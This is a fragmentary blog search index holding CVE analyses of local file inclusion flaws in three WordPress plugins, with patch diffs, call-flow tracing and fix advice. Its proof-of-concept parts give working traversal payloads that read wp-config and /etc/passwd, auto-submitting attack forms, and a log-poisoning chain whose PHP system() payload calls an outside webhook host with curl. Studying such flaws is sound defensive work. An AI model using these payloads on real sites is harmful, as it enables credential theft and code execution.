value=\"/../../../../../../wp-cofnig\"\u003e \u003c/form\u003e \u003cscript\u003e document.forms[0].submit() \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Step 2\rSend the link to an admin or a privileged user Warning This vulnerability can only be exploited on Windows, because file_exists() handles paths differently between operating systems. On Linux, if the path includes a non-existent directory, the function returns false. On Windows, the same path may return true, allowing the condition check to be bypassed and the vulnerability to be triggered. ","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rCreate a web page with a form that automatically sends a request with the LFI payload \u003c!DOCTYPE html\u003e Document Step 2\rSend the link to an admin or a privileged user Warning This vulnerability can only be exploited on Windows, because file_exists() handles paths differently between operating systems. On Linux, if the path includes a non-existent directory, the function returns false. On Windows, the same path may return true, allowing the condition check to be bypassed and the vulnerability to be triggered. ","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#step-1"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rCreate a web page with a form that automatically sends a request with the LFI payload \u003c!DOCTYPE html\u003e Document Step 2\rSend the link to an admin or a privileged user Warning This vulnerability can only be exploited on Windows, because file_exists() handles paths differently between operating systems. On Linux, if the path includes a non-existent directory, the function returns false. On Windows, the same path may return true, allowing the condition check to be bypassed and the vulnerability to be triggered. ","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#step-2"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rWP REST Cache versions ≤ 2025.1.0 allow Local File Inclusion via the sub parameter. The patch in 2025.1.1 fixes the issue by validating the file location before including it—ensuring files are only loaded if they reside in the partials directory—thereby preventing path traversal/LFI. ","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rConcatenating request data directly into file paths risks LFI. Always validate the real/resolved file location (absolute path) before including. Restrict allowed files by comparing against an intended directory (whitelist) — this is more effective than merely sanitizing characters. Test on multiple platforms (Windows/Linux) since file-handling behavior can differ. ","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rFile Inclusion/Path traversal — Hacktrick WordPress WP REST Cache Plugin \u003c= 2025.1.0 is vulnerable to Local File Inclusion ","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress LatePoint Plugin.","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin LatePoint version ≤ 5.1.93 contains a Local File Inclusion vulnerability that allows unauthenticated attackers to control the file parameter in the include/require statement, thereby injecting or reading local files on the server (e.g., configuration files containing credentials), leading to sensitive information disclosure and, in some configurations, potential code execution. CVE ID: CVE-2025-6715 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 5.1.93 Patched Versions: 5.1.94 CVSS severity: High (8.1) Required Privilege: Unauthenticated Product: WordPress LatePoint Plugin ","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - LatePoint: 5.1.93 (vulnerable) and 5.1.94 (patched). Diff tool - Meld or any diff tool to compare and inspect differences between versions. ","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rVulnerable version: function render($view, $layout = 'none', $extra_vars = array()){ $this-\u003evars['route_name'] = $this-\u003eroute_name; extract($extra_vars); extract($this-\u003evars); ob_start(); if($layout != 'none'){ // rendering layout, view variable will be passed and used in layout file include LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $this-\u003eadd_extension($layout, '.php'); }else{ include $this-\u003eadd_extension($view, '.php'); } $response_html = ob_get_clean(); return $response_html; } In the vulnerable version, the render() function appends .php to $layout and directly includes it without validation, leading to Local File Inclusion (LFI) if $layout is controlled by user input. Patched version: function render($view, $layout = 'none', $extra_vars = array()){ $this-\u003evars['route_name'] = $this-\u003eroute_name; extract($extra_vars); extract($this-\u003evars); ob_start(); if($layout != 'none'){ $layout_path = $this-\u003eget_safe_layout_path($layout); // rendering layout, view variable will be passed and used in layout file if($layout_path){ include $layout_path; }else{ __('Invalid layout', 'latepoint'); } }else{ include $this-\u003eadd_extension($view, '.php'); } $response_html = ob_get_clean(); return $response_html; } private function get_safe_layout_path($layout) { // 1. Remove any path separators and null bytes $layout = str_replace(['/', '\\\\', \"\\0\"], '', $layout); // 2. Remove any dots to prevent directory traversal $layout = str_replace('.', '', $layout); // 3. Only allow alphanumeric, underscore, and hyphen $layout = preg_replace('/[^a-zA-Z0-9_-]/', '', $layout); // 4. Construct the full path $layout_file = $this-\u003eadd_extension($layout, '.php'); $full_path = LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $layout_file; // 5. Use realpath to resolve any remaining traversal attempts $real_path = realpath($full_path); $base_path = realpath(LATEPOINT_VIEWS_LAYOUTS_ABSPATH); // 6. Ensure the resolved path is within the layouts directory if ($real_path \u0026\u0026 $base_path \u0026\u0026 strpos($real_path, $base_path) === 0) { return $real_path; } return false; } The patch adds get_safe_layout_path() to remove /, \\, ., and null bytes; only allow [A-Za-z0-9_-]; construct the path, use realpath() and compare it with LATEPOINT_VIEWS_LAYOUTS_ABSPATH. The file is included only if valid, preventing LFI. ","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rThe render() function is called in 12 different locations, so manual tracing would be time-consuming. 12 call locations of render() To optimize, use a debugger: Set a breakpoint inside render(). Perform various actions through the UI. Each time render() is called, execution pauses at the breakpoint and highlights the corresponding code line, allowing quick identification of call flows. Debugger jumps to breakpoint 👉 When accessing the endpoint http://localhost/wp-admin/admin.php?page=latepoint\u0026route_name=calendars__view with route names as plugin submenus, render() is invoked with the default layout admin. Default layout Examining the callstack reveals the call flow leading to render(). Callstack flow function format_render_return($view_name, $extra_vars = array(), $json_return_vars = array(), $from_shared_folder = false){ $html = ''; if($this-\u003eget_return_format() == 'json'){ if(is_array($view_name)) $view_name = $view_name['json_view_name']; $response_html = $this-\u003erender($this-\u003eget_view_uri($view_name, $from_shared_folder), 'none', $extra_vars); $this-\u003esend_json(array_merge(array('status' =\u003e LATEPOINT_STATUS_SUCCESS, 'message' =\u003e $response_html), $json_return_vars)); }else{ if(is_array($view_name)) $view_name = $view_name['html_view_name']; $this-\u003eextra_css_classes[] = $this-\u003egenerate_css_class($view_name); $this-\u003evars['extra_css_classes'] = $this-\u003eextra_css_classes; $html = $this-\u003erender($this-\u003eget_view_uri($view_name, $from_shared_folder), $this-\u003eget_layout(), $extra_vars); } return $html; } render() is called by format_render_return() when get_return_format() is not json; by default, it’s html. $return_format = 'html' ... function get_return_format(){ return $this-\u003ereturn_format; } The layout we’re interested in comes from get_layout(). Since get_layout() exists, there should be a corresponding set_layout(). Searching for set_layout in the same file shows how the layout value is set. $layout = 'admin' ... function set_layout($layout = 'admin'){ if(isset($this-\u003eparams['layout'])){ $this-\u003elayout = $this-\u003eparams['layout']; }else{ $this-\u003elayout = $layout; } } The $layout variable is assigned the default value 'admin', matching the layout analyzed earlier. The set_layout() function determines which layout to use: If $this-\u003eparams contains a layout parameter, it uses that value. Otherwise, it falls back to the default ('admin'). We can use the debugger again to inspect $params. Value of $params $params includes two keys, page and route_name, matching the query parameters when accessing http://localhost/wp-admin/admin.php?page=latepoint\u0026route_name=calendars__view. 👉 Therefore, layout can also be passed as a URL parameter — which we can exploit. Try accessing the endpoint with a layout parameter: GET /wp-admin/admin.php?page=latepoint\u0026route_name=calendars__view\u0026layout=payload HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-admin/admin.php?page=latepoint Connection: keep-alive Cookie: wordpress_86a9106ae65537651a8e456835b316ab=admin%7C1760967480%7CoCVvKc0bJQfyBklDsH6H9DopdAB5cs1Sto11eNkRdYj%7Cc08cb50e24c24f218212642e90eebec4ec8ab1c3fb72a2443f62f3c27e253edd; wp-settings-time-1=1760795495; language=en; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1760967480%7CoCVvKc0bJQfyBklDsH6H9DopdAB5cs1Sto11eNkRdYj%7C2e46c824d8ba0f581459540ee6553fac38b1af797e42b03957dd3ab2a79a4175 $layout is now fully under our control. Controlled $layout ","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rCreate a webpage containing a form that automatically submits an LFI payload. \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cform action=\"http://localhost:80/wp-admin/admin.php\" method=\"get\"\u003e \u003cinput type=\"text\" name=\"page\" value=\"latepoint\"\u003e \u003cinput type=\"text\" name=\"route_name\" value=\"calendars__view\"\u003e \u003cinput type=\"text\" name=\"layout\" value=\"../../../../../../wp-config\"\u003e \u003c/form\u003e \u003cscript\u003e document.forms[0].submit() \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Step 2\rSend the malicious webpage link to an admin or privileged user. Result: The debugger stopped at wp-config.php. Successful LFI result Info\rSince this CVE is Unauthenticated, it leverages a plugin endpoint without nonce checking. Logged-in users visiting the malicious page automatically send the request to the vulnerable WordPress site along with their cookies. ","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rCreate a webpage containing a form that automatically submits an LFI payload. \u003c!DOCTYPE html\u003e Document Step 2\rSend the malicious webpage link to an admin or privileged user. Result: The debugger stopped at wp-config.php. Successful LFI result Info\rSince this CVE is Unauthenticated, it leverages a plugin endpoint without nonce checking. Logged-in users visiting the malicious page automatically send the request to the vulnerable WordPress site along with their cookies. ","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#step-1"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rCreate a webpage containing a form that automatically submits an LFI payload. \u003c!DOCTYPE html\u003e Document Step 2\rSend the malicious webpage link to an admin or privileged user. Result: The debugger stopped at wp-config.php. Successful LFI result Info\rSince this CVE is Unauthenticated, it leverages a plugin endpoint without nonce checking. Logged-in users visiting the malicious page automatically send the request to the vulnerable WordPress site along with their cookies. ","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#step-2"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rVersions ≤ 5.1.93 of LatePoint are vulnerable to LFI because the layout parameter is not validated before being passed to include(), leading to potential local file disclosure (e.g., wp-config.php). The issue was patched in 5.1.94 by sanitizing characters, using realpath(), and restricting to valid directories. ","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:4:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rThis is LFI (file read) — no RCE observed in PoC. Path-controlled parameters must be sanitized + canonicalized before use. Use realpath() and base directory validation to prevent traversal. Never include directly from request data; use safe helpers like get_safe_layout_path(). ","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:4:3","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rFile Inclusion/Path traversal — Hacktrick WordPress LatePoint Plugin \u003c= 5.1.93 is vulnerable to Local File Inclusion ","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Hide My WP Ghost Plugin.","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe Hide My WP Ghost plugin version ≤ 5.4.01 contains a Local File Inclusion vulnerability that allows an unauthenticated attacker to control the file parameter used in include/require, thereby injecting or reading local files on the server (for example configuration files containing credentials), leading to sensitive information disclosure and, in some configurations, possible code execution. CVE ID: CVE-2025-26909 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 5.4.01 Patched Versions: 5.4.02 CVSS severity: High (9.6) Required Privilege: Unauthenticated Product: WordPress Hide My WP Ghost Plugin ","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Hide My WP Ghost: 5.3.02 (vulnerable) and 5.4.02 (patched). Diff tool - Meld or any diff/comparison tool to check and compare differences between the two versions. ","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rVulnerable version: public function getOriginalUrl( $url ) { // Build the rewrite rules if they are not already built if ( empty( $this-\u003e_rewrites ) ) { $this-\u003ebuildRedirect(); } // Parse the URL components $parse_url = wp_parse_url( $url ); // Get the home root path $path = wp_parse_url( home_url(), PHP_URL_PATH ); // Backslash the paths if ( $path \u003c\u003e '' ) { $parse_url['path'] = preg_replace( '/^' . preg_quote( $path, '/' ) . '/', '', $parse_url['path'] ); } // Replace paths to original based on rewrite rules if ( isset( $this-\u003e_rewrites['from'] ) \u0026\u0026 isset( $this-\u003e_rewrites['to'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['from'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['to'] ) ) { $parse_url['path'] = preg_replace( $this-\u003e_rewrites['from'], $this-\u003e_rewrites['to'], $parse_url['path'], 1 ); } // Default to https if the scheme is not set if ( ! isset( $parse_url['scheme'] ) ) { $parse_url['scheme'] = 'https'; } // Reconstruct the URL if ( isset( $parse_url['port'] ) \u0026\u0026 $parse_url['port'] \u003c\u003e 80 ) { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . ':' . $parse_url['port'] . $path . $parse_url['path']; } else { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . $path . $parse_url['path']; } // Append query string if present if ( isset( $parse_url['query'] ) \u0026\u0026 ! empty( $parse_url['query'] ) ) { $query = $parse_url['query']; $query = str_replace( array( '?', '%3F' ), '\u0026', $query ); $new_url .= ( ! strpos( $new_url, '?' ) ? '?' : '\u0026' ) . $query; } // Return the constructed URL return $new_url; } The getOriginalUrl() function is used to parse and reconstruct the original URL based on the system’s rewrite rules. In the vulnerable version, the value of $new_url is not sanitized before being returned, allowing an attacker to inject malicious path components like ../../etc/passwd, leading to LFI risk. Patched version: public function getOriginalUrl( $url ) { // Build the rewrite rules if they are not already built if ( empty( $this-\u003e_rewrites ) ) { $this-\u003ebuildRedirect(); } // Parse the URL components $parse_url = wp_parse_url( $url ); // Only if there is a path to change if( !isset( $parse_url['path'] ) ) { return $url; } // Get the home root path $path = wp_parse_url( home_url(), PHP_URL_PATH ); // Backslash the paths if ( $path \u003c\u003e '' ) { $parse_url['path'] = preg_replace( '/^' . preg_quote( $path, '/' ) . '/', '', $parse_url['path'] ); } // Replace paths to original based on rewrite rules if ( isset( $this-\u003e_rewrites['from'] ) \u0026\u0026 isset( $this-\u003e_rewrites['to'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['from'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['to'] ) ) { $parse_url['path'] = preg_replace( $this-\u003e_rewrites['from'], $this-\u003e_rewrites['to'], $parse_url['path'], 1 ); } // Default to https if the scheme is not set if ( ! isset( $parse_url['scheme'] ) ) { $parse_url['scheme'] = 'https'; } // Reconstruct the URL if ( isset( $parse_url['port'] ) \u0026\u0026 $parse_url['port'] \u003c\u003e 80 ) { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . ':' . $parse_url['port'] . $path . $parse_url['path']; } else { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . $path . $parse_url['path']; } // Append query string if present if ( isset( $parse_url['query'] ) \u0026\u0026 ! empty( $parse_url['query'] ) ) { $query = $parse_url['query']; $query = str_replace( array( '?', '%3F' ), '\u0026', $query ); $new_url .= ( ! strpos( $new_url, '?' ) ? '?' : '\u0026' ) . $query; } // Return the constructed URL return sanitize_url( $new_url ); } The patch calls sanitize_url($new_url) before returning, which helps remove dangerous path components or schemes, preventing LFI. ","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rgetOriginalUrl() is called in showFile(), and its return value is assigned to $new_url public function showFile( $url ) { // other logic $new_url = $this-\u003egetOriginalUrl( $url ); $new_url_no_query = ( ( strpos( $new_url, '?' ) !== false ) ? substr( $new_url, 0, strpos( $new_url, '?' ) ) : $new_url ); $new_path = $this-\u003egetOriginalPath( $new_url ); $ctype = false; if ( $ext = $this-\u003eisFile( $new_url ) ) { // other logic } elseif ( strpos( trailingslashit( $new_url_no_query ), '/' . HMWP_Classes_Tools::getOption( 'hmwp_login_url' ) . '/' ) || strpos( trailingslashit( $new_url_no_query ), '/' . HMWP_Classes_Tools::getDefault( 'hmwp_login_url' ) . '/' ) ) { // other logic } elseif ( $url \u003c\u003e $new_url ) { if ( stripos( trailingslashit( $new_url_no_query ), '/' . HMWP_Classes_Tools::getDefault( 'hmwp_wp-json' ) . '/' ) !== false ) { // other logic } elseif ( strpos( trailingslashit( $new_url_no_query ), '/' . HMWP_Classes_Tools::getDefault( 'hmwp_activate_url' ) . '/' ) !== false || strpos( trailingslashit( $new_url_no_query ), '/' . HMWP_Classes_Tools::getDefault( 'hmwp_wp-signup_url' ) . '/' ) !== false ) { ob_start(); include $new_path; $content = ob_get_clean(); header( \"HTTP/1.1 200 OK\" ); //Echo the html file content echo $content; exit(); } elseif ( ! HMWP_Classes_Tools::getValue( 'nordt' ) ) { // other logic } } } include $new_path is the point that can cause LFI; for it to be reached, the surrounding conditions must be satisfied. $url is different from $new_url In getOriginalUrl() the query handling is: if ( isset( $parse_url['query'] ) \u0026\u0026 ! empty( $parse_url['query'] ) ) { $query = $parse_url['query']; $query = str_replace( array( '?', '%3F' ), '\u0026', $query ); $new_url .= ( ! strpos( $new_url, '?' ) ? '?' : '\u0026' ) . $query; } wp_parse_url( 'http://localhost/x/abc?' ) -\u003e has a path but query is empty (or query is unset / empty). The condition isset(...) \u0026\u0026 ! empty(...) will fail for a bare ? without parameters, so nothing is appended to $new_url. $new_url returns http://localhost/x/abc (no ?), while the original $url is http://localhost/x/abc?, so they differ and ($url \u003c\u003e $new_url) is true. $new_url_no_query must contain the string '/' . HMWP_Classes_Tools::getDefault('hmwp_activate_url') . '/'. Searching the plugin source for hmwp_activate_url, we find the function HMWP_Classes_Tools::getDefault('hmwp_activate_url') returns wp-activate.php. Return value of HMWP_Classes_Tools::getDefault( 'hmwp_activate_url' ) Therefore, the practical condition is that $new_url_no_query must contain /wp-activate.php/. 👉 Thus, for include $new_path to be executed, the URL must have a trailing ? (so $url \u003c\u003e $new_url) and contain /wp-activate.php/ in the path. $new_path is the return value of getOriginalPath($new_url) public function getOriginalPath( $new_url ) { // Remove domain from path $new_path = str_replace( home_url(), '', $new_url ); // Remove queries from path if ( strpos( $new_path, '?' ) !== false ) { $new_path = substr( $new_path, 0, strpos( $new_path, '?' ) ); } return HMWP_Classes_Tools::getRootPath() . ltrim( $new_path, '/' ); } This function returns the root path without the query string, for example: \"http://localhost/x/wp-activate.php?\" -\u003e \"/srv/www/wordpress/x/wp-activate.php\" So we have the necessary conditions for LFI to occur; we need to find the call flow to showFile() public function maybeShowNotFound() { //If the file doesn't exist //show the file content if ( is_404() ) { $this-\u003eshowFile( $this-\u003egetCurrentURL() ); } else { $this-\u003emaybeShowLogin( $this-\u003egetCurrentURL() ); } } showFile() is called by maybeShowNotFound when the client requests a non-existent resource, with the parameter being the result of getCurrentURL(). public function getCurrentURL() { $url = ''; if ( isset( $_SERVER['HTTP_HOST'] ) ) { // build the URL in the address bar $url = is_ssl() ? 'https://' : 'http://'; $url .= $_SERVER['HTTP_HOST']; $url .= rawurldecode( $_SERVER['REQUEST_URI'] ); } return $url; } The URI from $_SERVER['REQUEST","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rSend a request with the LFI payload GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/etc/passwd? HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Debug: Debugger with valid payload Result: Successful LFI result Explanation: /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/etc/passwd? after decoding becomes /x/wp-activate.php/..///..///..///..///../etc/passwd? We use this string to trick Apache so that Apache does not detect Document Root traversal. If we use /x/wp-activate.php/../../../../../etc/passwd? Apache will detect the Document Root traversal. /// is still accepted as equivalent to /, for example: w41bu1@22NS088:~$ ls ///////// bin boot cdrom dev etc home lib lib64 lost+found media mnt opt proc root run sbin snap srv sys tmp usr var swap.img ","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Log poisoning → LFI → RCE\rStep 1\rSend a request with PHP code placed in the User-Agent header GET / HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu;\u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Step 2\rSend a request with the LFI payload pointing to /var/log/apache2/other_vhosts_access.log GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Result: Successful LFI =\u003e RCE result Explanation: \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e When visiting the site with a User‑Agent containing the payload above, Apache will log this payload into the access log: w41bu1@22NS088:~$ cat /var/log/apache2/other_vhosts_access.log 127.0.1.1:80 127.0.0.1 - - [18/Oct/2025:19:10:08 +0700] \"GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1\" 403 2844 \"-\" \"Mozilla/5.0 (X11; Ubuntu; \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003eLinux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0\" When include() loads a file, PHP will execute any PHP code (\u003c?php ?\u003e) contained in the file before returning. The payload is Base64-encoded and decoded at include time with base64_decode to avoid escaping issues with quotes (\" → \\\") when the logger writes it. The decoded command becomes: curl -I 